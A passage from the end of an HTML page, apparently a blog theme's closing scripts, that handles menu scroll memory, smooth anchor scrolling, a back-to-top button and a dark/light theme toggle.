            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
